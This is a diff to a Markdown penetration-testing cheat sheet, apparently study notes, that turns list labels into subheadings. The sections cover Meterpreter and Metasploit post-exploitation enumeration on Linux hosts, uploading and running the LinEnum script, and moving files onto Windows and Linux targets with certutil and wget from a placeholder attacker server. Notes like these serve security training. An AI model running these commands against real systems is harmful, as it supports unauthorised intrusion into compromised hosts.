@@ -345,6 +345,7 @@ meterpreter > download C:\\Temp\\jaws-enum.txt
 - https://github.com/411Hall/JAWS
 
 ### Linux Local Enumeration
+#### Enumerating System Information
 ```
 meterpreter > sysinfo
 
@@ -360,8 +361,8 @@ lsblk
 dpkg -l
 cat /etc/shells
 ```
-- Enumerating System Information
 
+#### Enumerating Users & Groups
 ```
 meterpreter > getuid
 
@@ -375,9 +376,9 @@ w
 last
 lastlog
 ```
-- Enumerating Users & Groups
-	- `uid=0` is root
+- `uid=0` is root
 
+#### Enumerating Network Information
 ```
 meterpreter > ifconfig
 meterpreter > netstat
@@ -391,8 +392,8 @@ cat /etc/hostname
 cat /etc/hosts
 cat /etc/resolv.conf
 ```
-- Enumerating Network Information
 
+#### Enumerating Processes & Cron Jobs
 ```
 meterpreter > ps
 meterpreter > ps -S <process_name>
@@ -411,8 +412,8 @@ ls -al /etc/cron*
 cat /etc/crontab
 cat /etc/cron*
 ```
-- Enumerating Processes & Cron Jobs
 
+#### Automating Linux Local Enumeration 
 ```
 use post/linux/gather/enum_configs
 use post/linux/gather/enum_network
@@ -421,9 +422,9 @@ use post/linux/gather/checkvm
 
 cat /root/.msf4/loot/<filename>.txt
 ```
-- Automating Linux Local Enumeration
-	- Post-exploitation modules need to `set SESSION <session_id>`
+- Post-exploitation modules need to `set SESSION <session_id>`
 
+#### LinEnum
 ```
 meterpreter > cd /tmp
 meterpreter > upload /root/linenum.sh
@@ -434,26 +435,26 @@ meterpreter > shell
 chmod +x linenum.sh
 ./linenum.sh
 ```
-- LinEnum (https://github.com/rebootuser/LinEnum)
+- https://github.com/rebootuser/LinEnum
 
 ### Transferring Files To Windows and Linux Targets
+#### Setting Up A Web Server With Python
 ```
 python -m SimpleHTTPServer 80
 python3 -m http.server 80
 ```
-- Setting Up A Web Server With Python
 
+#### Transferring Files to Windows Targets
 ```
 mkdir C:\Temp
 cd C:\Temp
 certutil -urlcache -f http://<ip>/<filename> <filename>
 ```
-- Transferring Files to Windows Targets
 
+#### Transferring Files to Linux Targets
 ```
 cd /tmp
 wget http://<ip>/<filename>
 ```
-- Transferring Files to Linux Targets
 
 ## Social Engineering
